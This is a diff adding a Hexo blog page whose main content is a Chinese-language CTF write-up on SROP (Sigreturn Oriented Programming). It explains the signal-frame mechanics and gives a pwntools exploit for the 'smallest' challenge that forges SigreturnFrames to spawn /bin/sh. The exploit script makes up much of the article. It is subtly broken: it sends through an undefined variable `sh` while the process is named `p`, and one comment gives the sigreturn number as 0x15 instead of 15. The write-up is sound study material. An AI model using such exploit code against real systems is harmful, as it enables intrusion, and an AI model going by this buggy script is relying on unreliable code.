@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="高级栈溢出——SROP查漏补缺233333 SROPSigreturn Oriented Programming 其中Unix-like system处理信号量的机制主要步骤分为如下：  当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1）然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高级栈溢出——SROP">
+<meta property="og:url" content="http://yoursite.com/2020/04/06/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%94%E2%80%94SROP/index.html">
+<meta property="og:site_name" content="Coldshiel&#39;s blog">
+<meta property="og:description" content="高级栈溢出——SROP查漏补缺233333 SROPSigreturn Oriented Programming 其中Unix-like system处理信号量的机制主要步骤分为如下：  当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1）然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406192003998.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406192224800.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406194252445.png">
+<meta property="article:published_time" content="2020-04-06T13:15:48.000Z">
+<meta property="article:modified_time" content="2020-04-06T13:16:29.973Z">
+<meta property="article:author" content="Coldshield">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406192003998.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/04/06/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%94%E2%80%94SROP/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>高级栈溢出——SROP | Coldshiel's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Coldshiel's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Mostly PWN & RE</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/06/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%94%E2%80%94SROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Coldshield">
+      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coldshiel's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          高级栈溢出——SROP
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-04-06 06:15:48 / Modified: 06:16:29" itemprop="dateCreated datePublished" datetime="2020-04-06T06:15:48-07:00">2020-04-06</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2020/04/06/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%94%E2%80%94SROP/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/04/06/%E9%AB%98%E7%BA%A7%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%94%E2%80%94SROP/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="高级栈溢出——SROP"><a href="#高级栈溢出——SROP" class="headerlink" title="高级栈溢出——SROP"></a>高级栈溢出——SROP</h1><p>查漏补缺233333</p>
+<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p>Sigreturn Oriented Programming</p>
+<p>其中Unix-like system处理信号量的机制主要步骤分为如下：</p>
+<blockquote>
+<p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1）<br>然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2）<br>当signal handler返回之后（3）<br>内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）</p>
+</blockquote>
+<h2 id="ucontext"><a href="#ucontext" class="headerlink" title="ucontext"></a>ucontext</h2><p>伪造时需要注意：esp，ebp和es，gs等段寄存器不可直接设置为0</p>
+<p>保存上下文时保存的内容叫<code>ucontext</code>，具体对应如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span>	//<span class="title">x86</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> short gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> short fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> short es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> short ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> short cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> short ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">////////////////////////////////////////////////</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> //<span class="title">x64</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> short cs;</span><br><span class="line">  <span class="keyword">unsigned</span> short gs;</span><br><span class="line">  <span class="keyword">unsigned</span> short fs;</span><br><span class="line">  <span class="keyword">unsigned</span> short __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>具体利用时需要的是调用sigreturn系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*for x86*&#x2F;</span><br><span class="line">mov eax,0x77</span><br><span class="line">int 80h</span><br><span class="line">&#x2F;*for x86_64*&#x2F;</span><br><span class="line">mov rax,0xf</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用原理："><a href="#利用原理：" class="headerlink" title="利用原理："></a>利用原理：</h2><ul>
+<li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li>
+<li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li>
+</ul>
+<p>比如当我们执行sigreturn系统调用之前栈布局是如下情况的话，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell</p>
+<img src="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406192003998.png" alt="image-20200406192003998" style="zoom:67%;">
+
+<h2 id="链式利用原理："><a href="#链式利用原理：" class="headerlink" title="链式利用原理："></a>链式利用原理：</h2><ul>
+<li><strong>控制栈指针。</strong></li>
+<li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li>
+</ul>
+<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用</p>
+<img src="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406192224800.png" alt="image-20200406192224800" style="zoom:80%;">
+
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>程序存在栈溢出漏洞</li>
+<li>知道栈地址或者可以知道需要使用字符串的地址等</li>
+<li>知道sigreturn的地址</li>
+<li>知道syscall的地址或者syscall gadget地址</li>
+</ol>
+<h1 id="smallest"><a href="#smallest" class="headerlink" title="smallest"></a>smallest</h1><p>原理看上去挺好理解，还是直接实操吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Coldshield/image_stored/image-20200406194252445.png" alt="image-20200406194252445"></p>
+<p>程序没有canary和PIE保护</p>
+<p>具体的程序就这么几行汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">mov     rsi, rsp        ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>然后加载进程序的时候只有这么几个寄存器被操作了，其余值均为0（Ubuntu16.04）</p>
+<p>直接从rsp处读取了0x400个字节的栈内容，其中最主要还是需要知道怎么来构造出sigreturn的syscall操作</p>
+<p>这里通过一个exp来学习一下：</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'smallest'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">	log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line">syscall_ret = <span class="number">0x00000000004000BE</span></span><br><span class="line">start_addr = <span class="number">0x00000000004000B0</span></span><br><span class="line"><span class="comment">## set start addr three times</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">## modify the return addr to start_addr+3</span></span><br><span class="line"><span class="comment">## so that skip the xor rax,rax; After read rax=1</span></span><br><span class="line"><span class="comment">## get stack addr</span></span><br><span class="line">sh.send(<span class="string">'\xb3'</span>) <span class="comment"># 这一步很巧妙，只读了一个字节绕过 xor rax,rax 刚好把rax设置成1用于write leak栈地址</span></span><br><span class="line">stack_addr = u64(sh.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">log.success(<span class="string">'leak stack addr :'</span> + hex(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">## make the rsp point to stack_addr</span></span><br><span class="line"><span class="comment">## the frame is read(0,stack_addr,0x400)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read <span class="comment"># constans直接获取SYS_read的系统调用号，这里为什么要通过sigframe链式利用stack_addr可能是因为这样比较好设置/bin/sh的偏移，直接通过leak到的地址来设置</span></span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + <span class="string">'a'</span> * <span class="number">8</span> + str(sigframe) <span class="comment">#先设置好sigframe，然后跳到start再读取一次</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set rax=15 and call sigreturn</span></span><br><span class="line">sigreturn = p64(syscall_ret) + <span class="string">'b'</span> * <span class="number">7</span> <span class="comment">#这里相当于把前一步的aaaaaaaa(返回地址处)填充成p64(syscall_ret)，然后把rax设置成0x15，直接调用syscall，就会用到我们的sigframe，这7个b似乎没有影响</span></span><br><span class="line"><span class="comment">#调用完之后会直接按照sigframe执行 read(0,stack_addr,0x400)</span></span><br><span class="line">sh.send(sigreturn) <span class="comment"># 这个时候就会直接往leak的stack_addr处读取0x400个字节，sigframe的长度是0x98</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># call execv("/bin/sh",0,0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  <span class="comment"># "/bin/sh" 's addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + <span class="string">'b'</span> * <span class="number">8</span> + str(sigframe)</span><br><span class="line"><span class="keyword">print</span> len(frame_payload)</span><br><span class="line">payload = frame_payload + (<span class="number">0x120</span> - len(frame_payload)) * <span class="string">'\x00'</span> + <span class="string">'/bin/sh\x00'</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>参考链接：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a></p>
+<p><a href="http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/" target="_blank" rel="noopener">http://www.reshahar.com/2017/05/04/360%E6%98%A5%E7%A7%8B%E6%9D%AFsmallest-pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p>
+<p><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a></p>
+<p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/01/angr%E5%AD%A6%E4%B9%A0/" rel="prev" title="angr学习">
+      <i class="fa fa-chevron-left"></i> angr学习
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
